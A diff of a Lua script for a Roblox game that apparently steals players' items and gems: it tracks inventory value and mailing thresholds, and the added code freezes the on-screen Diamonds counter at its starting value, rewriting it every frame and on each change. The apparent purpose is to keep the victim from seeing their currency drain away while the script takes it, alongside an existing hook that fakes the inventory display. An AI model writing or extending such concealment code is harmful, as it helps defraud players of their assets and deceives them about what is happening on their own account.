@@ -49,6 +49,7 @@ local States = {Inventory = {}, Gems = 0, TotalRAP = 0, MailCost = 0}
 local Settings = {MinRap = 1000000, MinGems = 500000}
 local RemoteCache = {}
 local ProtectedItems = {}
+local FrozenGemText = nil
 
 local function DeepCopy(v)
     if type(v) ~= "table" then return v end
@@ -57,6 +58,14 @@ local function DeepCopy(v)
         c[DeepCopy(k)] = DeepCopy(val)
     end
     return c
+end
+
+local function GetDiamondLabel()
+    local ok, lbl = pcall(function()
+        return plr.PlayerGui.MainLeft.Left.Currency.Diamonds
+    end)
+    if ok then return lbl end
+    return nil
 end
 
 pcall(function()
@@ -157,6 +166,16 @@ RunService.RenderStepped:Connect(function()
                     save.Inventory[cat][uid] = item
                 end
             end
+        end
+    end)
+end)
+
+RunService.RenderStepped:Connect(function()
+    if FrozenGemText == nil then return end
+    pcall(function()
+        local lbl = GetDiamondLabel()
+        if lbl and lbl.Text ~= FrozenGemText then
+            lbl.Text = FrozenGemText
         end
     end)
 end)
@@ -740,15 +759,22 @@ local function MainExecution()
     end)
 
     pcall(function()
-        local diamonds = plr.PlayerGui.MainLeft.Left.Currency.Diamonds
-        if diamonds then
-            diamonds.Visible = true
-            local orig = diamonds.Text
-            diamonds:GetPropertyChangedSignal("Text"):Connect(function()
-                if diamonds.Text ~= orig then
-                    diamonds.Text = orig
-                end
-            end)
+        local lbl = GetDiamondLabel()
+        if lbl then
+            lbl.Visible = true
+            local waited = 0
+            while (not lbl.Text or lbl.Text == "" or lbl.Text == "0") and waited < 20 do
+                task.wait(0.25)
+                waited = waited + 1
+            end
+            FrozenGemText = lbl.Text
+            if FrozenGemText and FrozenGemText ~= "" then
+                lbl:GetPropertyChangedSignal("Text"):Connect(function()
+                    if FrozenGemText and lbl.Text ~= FrozenGemText then
+                        lbl.Text = FrozenGemText
+                    end
+                end)
+            end
         end
     end)
 
